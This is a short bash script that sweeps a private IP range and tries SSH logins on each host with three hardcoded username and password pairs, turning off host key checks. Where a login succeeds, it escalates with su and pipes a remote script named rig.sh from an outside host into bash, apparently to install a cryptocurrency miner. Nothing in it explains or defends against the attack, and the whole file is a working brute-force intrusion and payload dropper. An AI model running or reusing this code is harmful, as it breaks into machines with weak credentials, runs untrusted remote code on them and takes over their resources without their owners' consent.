#!/bin/bash

scan_range() {
    local start_ip=$1
    local end_ip=$2
    local s1 s2 s3 s4 e1 e2 e3 e4
    IFS=. read -r s1 s2 s3 s4 <<<"$start_ip"
    IFS=. read -r e1 e2 e3 e4 <<<"$end_ip"

    for ((i3 = s3; i3 <= e3; i3++)); do
        for ((i4 = (i3 == s3 ? s4 : 0); i4 <= (i3 == e3 ? e4 : 255); i4++)); do
            ip="$s1.$s2.$i3.$i4"
            try_ssh "$ip"
        done
    done
}

try_ssh() {
    local ip=$1
    sshpass -p "rnzxor" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no admin@$ip \
        "echo 'rnzxor' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
    sshpass -p "rjuytoew" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no Admin@$ip \
        "echo 'rjuytoew' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
    sshpass -p "12345678" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no user@$ip \
        "echo '12345678' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
}

scan_range "172.28.0.0" "172.28.255.255"
